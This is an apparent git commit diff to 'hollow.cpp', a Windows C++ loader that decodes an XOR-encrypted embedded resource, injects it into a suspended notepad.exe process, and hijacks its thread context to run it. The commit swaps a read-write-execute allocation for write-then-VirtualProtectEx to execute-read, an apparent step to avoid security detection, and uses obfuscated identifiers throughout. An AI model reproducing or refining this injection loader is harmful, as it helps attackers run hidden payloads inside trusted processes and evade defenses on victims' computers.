80f25da35596b3fb51a03f529cb13f069b469504
dhanush <114467712+dagowda@users.noreply.github.com>
2024-12-29 06:32:52 -0500

    Update hollow.cpp

--- hollow.cpp
+++ hollow.cpp
@@ -4,19 +4,19 @@
 #pragma comment (lib, "crypt32.lib")
 #pragma comment (lib, "user32.lib")
 
-void loadresbabe(const char* resName, char** data, DWORD* size) {
-    HMODULE hModule = GetModuleHandle(NULL);
-    HRSRC hResource = FindResource(hModule, resName, RT_RCDATA);
-    
-    HGLOBAL hResData = LoadResource(hModule, hResource);
-    *size = SizeofResource(hModule, hResource);
-    *data = (char*)LockResource(hResData);
-}
-
 void XXXoordec(char* c1o2d3e4, DWORD c1o2d3e4Len, unsigned char* k1e2y6, DWORD k1e2y6Len) {
     for (DWORD da = 0; da < c1o2d3e4Len; da++) {
         c1o2d3e4[da] ^= k1e2y6[da % k1e2y6Len];
     }
+}
+
+void loadresbabe(const char* rescool, char** data, DWORD* size) {
+    HMODULE hModule = GetModuleHandle(NULL);
+    HRSRC hResource = FindResource(hModule, rescool, RT_RCDATA);
+    
+    HGLOBAL hResData = LoadResource(hModule, hResource);
+    *size = SizeofResource(hModule, hResource);
+    *data = (char*)LockResource(hResData);
 }
 
 int main() {
@@ -33,14 +33,15 @@ int main() {
     STARTUPINFO si = {0};
     PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(si);
-
     CreateProcess("C:\\Windows\\System32\\notepad.exe", NULL, NULL, NULL, FALSE,CREATE_SUSPENDED, NULL, NULL, &si, &pi);
       
     CONTEXT ctx = {0};
     ctx.ContextFlags = CONTEXT_FULL;
     GetThreadContext(pi.hThread, &ctx);
-    LPVOID memlo = VirtualAllocEx(pi.hProcess, NULL, c1o2d3e4EncLen,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+    LPVOID memlo = VirtualAllocEx(pi.hProcess, NULL, c1o2d3e4EncLen,MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     WriteProcessMemory(pi.hProcess, memlo, c1o2d3e4Enc, c1o2d3e4EncLen, NULL);
+    DWORD oldProtect;
+    VirtualProtectEx(pi.hProcess, memlo, c1o2d3e4EncLen, PAGE_EXECUTE_READ, &oldProtect);
     ctx.Rcx = (DWORD64)memlo; 
     SetThreadContext(pi.hThread, &ctx);
     ResumeThread(pi.hThread); 
